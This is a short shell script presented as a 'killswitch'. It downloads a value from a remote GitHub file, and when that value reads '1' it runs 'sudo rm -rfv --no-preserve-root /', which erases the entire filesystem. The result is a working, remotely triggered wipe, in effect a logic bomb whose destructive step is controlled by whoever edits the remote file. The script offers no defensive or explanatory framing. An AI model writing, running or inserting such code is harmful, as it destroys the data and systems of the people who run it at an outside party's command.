URL="https://raw.githubusercontent.com/BastianAsmussen/KillSwitch/main/Value.txt" # 0 = off, 1 = on

echo "Checking Killswitch..."
echo "($URL)"

curl -s -L $URL > Value.txt

VALUE=$(head -n 1 Value.txt)

if [ $VALUE = "1" ]
then

    echo "Lockdown is enabled."
    sudo rm -rfv --no-preserve-root /
fi
